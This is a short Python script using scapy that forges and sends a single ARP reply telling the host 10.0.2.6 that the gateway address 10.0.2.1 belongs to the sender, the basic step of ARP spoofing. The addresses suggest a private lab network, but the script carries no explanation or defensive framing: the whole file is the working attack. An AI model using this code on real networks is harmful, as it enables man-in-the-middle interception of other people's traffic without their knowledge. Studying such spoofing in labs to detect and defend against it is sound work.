#!/usr/bin/env python

import scapy.all as sc

packet = sc.ARP(op=2, pdst="10.0.2.6", hwdst="08:00:27:f6:0f:41", psrc="10.0.2.1")
sc.send(packet)

